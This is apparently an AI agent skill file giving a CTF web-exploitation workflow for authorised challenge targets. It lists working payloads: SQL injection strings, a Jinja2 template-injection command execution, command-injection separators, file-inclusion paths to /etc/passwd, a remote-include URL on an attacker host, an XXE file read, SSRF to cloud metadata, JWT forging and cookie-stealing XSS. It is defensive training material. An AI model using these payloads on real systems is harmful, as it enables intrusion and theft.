---
name: ctf-web
description: >
  CTF web exploitation workflow — recon, source leaks, injection (SQLi, SSTI,
  command, NoSQL), LFI/RFI, XXE, SSRF, deserialization, auth/JWT, and client-side
  (XSS). Use for any web/URL challenge. Authorised targets only.
---

# CTF Web Workflow

> Only test the challenge target you were given. Do not touch other hosts.

## 1. Recon — `ctf_web_probe`
Pulls headers, title, server/tech fingerprint, cookies & security headers, and
probes source-leak paths (`.git/HEAD`, `.env`, backups, swagger, `/flag`).
Then `ctf_web_fuzz` for content discovery (ffuf/gobuster, bundled wordlist).
Read the HTML source and JS bundles — flags, endpoints, and creds hide there.

## 2. Source leaks (fast wins)
- `/.git/` exposed → dump it: `git-dumper http://host/.git/ out` then `git log -p`.
- `.env`, `*.bak`, `*.zip`, `.DS_Store`, `/backup` → download and read.
- Swagger/`graphql` → enumerate endpoints; GraphQL introspection query.

## 3. Injection
- **SQLi**: test `'`, `"`, `)`; UNION-based (`ORDER BY`, `UNION SELECT`),
  boolean/time blind (`' OR 1=1-- -`, `' OR SLEEP(5)-- -`). Automate hard cases
  with `ctf_run sqlmap -u URL --batch --dump`.
- **SSTI**: `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`. 49 ⇒ template engine; escalate
  Jinja2 `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- **Command injection**: `; id`, `| id`, `$(id)`, `` `id` ``, newline `%0a`.
- **NoSQL**: `{"$ne":null}`, `{"$gt":""}` in JSON bodies/params.

## 4. File & request-side
- **LFI**: `?page=../../../../etc/passwd`, `php://filter/convert.base64-encode/
  resource=index.php` to read source; log poisoning / `/proc/self/environ` to RCE.
- **RFI**: `?page=http://attacker/shell.txt` if allow_url_include.
- **XXE**: external entity to read files (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`).
- **SSRF**: make the server fetch `http://169.254.169.254/` (cloud metadata) or
  internal services; bypass filters with `[::]`, decimal IPs, redirects.
- **Deserialization**: PHP `O:`/`__wakeup`, Python pickle, Java `ysoserial`,
  Node `node-serialize`. Build a gadget chain → RCE.

## 5. Auth & JWT — `ctf_jwt`
Decode + audit a token, crack weak HS256 secrets (bundled wordlist), and forge:
- `alg=none` accepted → forge unsigned token with elevated claims.
- HS/RS confusion → sign HS256 using the server's RSA **public** key as the secret.
- `kid` header injection → path traversal / SQLi to control the key.
Also check: IDOR (increment IDs), weak session tokens, password reset flaws,
cookie flags, and OAuth misconfig.

## 6. Client-side
- **XSS** (reflected/stored/DOM): `<script>`, `<img src=x onerror=...>`, steal
  admin cookie/flag via a webhook. Useful when a bot visits your input.
- **CSRF**, **CORS** misconfig, **prototype pollution**, **open redirect**.

## 7. Finish
`ctf_extract_flags` on every response body and exfiltrated file. Flags often sit
in `/flag`, env vars, DB rows, or the admin bot's cookie.
